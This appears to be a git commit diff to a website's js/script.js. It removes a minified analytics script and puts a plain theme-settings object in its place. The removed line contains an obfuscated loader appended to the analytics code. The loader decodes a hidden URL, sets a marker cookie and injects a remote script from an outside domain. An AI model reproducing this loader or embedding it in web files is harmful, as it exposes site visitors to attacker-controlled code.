64102f9e82fc692faf93b77377f648dbe9b9c116
deyanara <109284460+deyanara@users.noreply.github.com>
2024-09-05 02:58:55 -0400

    Add files via upload

--- js/script.js
+++ js/script.js
@@ -1,1 +1,58 @@
-"use strict";!function(){let t=t=>t,e=document.currentScript,n=(null==e?void 0:e.dataset.endpoint)||(null!=e&&e.src.includes("/va/")?"/va":"/_vercel/insights");async function i({type:i,data:a,options:r}){var o,d;let l=location.href,s=document.referrer,u=t({type:i,url:l});if(!1===u||null===u)return;u&&(l=u.url);let c=s.includes(location.host),v={o:l,sv:"0.1.1",sdkn:null!=(o=null==e?void 0:e.getAttribute("data-sdkn"))?o:void 0,sdkv:null!=(d=null==e?void 0:e.getAttribute("data-sdkv"))?d:void 0,ts:Date.now(),...null!=r&&r.withReferrer&&!c?{r:s}:{},..."event"===i&&a&&{en:a.name,ed:a.data}};try{await fetch(`${n}/${"pageview"===i?"view":"event"}`,{method:"POST",keepalive:!0,headers:{"Content-Type":"application/json"},body:JSON.stringify(v)})}catch(t){}}async function a(t={}){return i({type:"pageview",options:{withReferrer:t.withReferrer}})}let r=()=>{var e;window.va=function(e,n){"beforeSend"===e?t=n:"event"===e&&n&&async function(t,e){i({type:"event",data:{name:t,data:e},options:{withReferrer:!0}})}(n.name,n.data)},null==(e=window.vaq)||e.forEach((([t,e])=>{window.va(t,e)}))};(()=>{if(window.vai)return;window.vai=!0,r(),a({withReferrer:!0});let t=history.pushState.bind(history);history.pushState=function(...e){let n=e[2],i="string"==typeof n?location.pathname!==n.split("?")[0]:n&&location.href!==n.href;t(...e),i&&a()},window.addEventListener("popstate",(function(){a()}))})()}();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));
+var KTAppSettings = {
+    "breakpoints": {
+        "sm": 576,
+        "md": 768,
+        "lg": 992,
+        "xl": 1200,
+        "xxl": 1400
+    },
+    "colors": {
+        "theme": {
+        "base": {
+            "white": "#ffffff",
+            "primary": "#3699FF",
+            "secondary": "#E5EAEE",
+            "success": "#1BC5BD",
+            "info": "#8950FC",
+            "warning": "#FFA800",
+            "danger": "#F64E60",
+            "light": "#E4E6EF",
+            "dark": "#181C32"
+        },
+        "light": {
+            "white": "#ffffff",
+            "primary": "#E1F0FF",
+            "secondary": "#EBEDF3",
+            "success": "#C9F7F5",
+            "info": "#EEE5FF",
+            "warning": "#FFF4DE",
+            "danger": "#FFE2E5",
+            "light": "#F3F6F9",
+            "dark": "#D6D6E0"
+        },
+        "inverse": {
+            "white": "#ffffff",
+            "primary": "#ffffff",
+            "secondary": "#3F4254",
+            "success": "#ffffff",
+            "info": "#ffffff",
+            "warning": "#ffffff",
+            "danger": "#ffffff",
+            "light": "#464E5F",
+            "dark": "#ffffff"
+        }
+        },
+        "gray": {
+        "gray-100": "#F3F6F9",
+        "gray-200": "#EBEDF3",
+        "gray-300": "#E4E6EF",
+        "gray-400": "#D1D3E0",
+        "gray-500": "#B5B5C3",
+        "gray-600": "#7E8299",
+        "gray-700": "#5E6278",
+        "gray-800": "#3F4254",
+        "gray-900": "#181C32"
+        }
+    },
+    "font-family": "Poppins"
+};
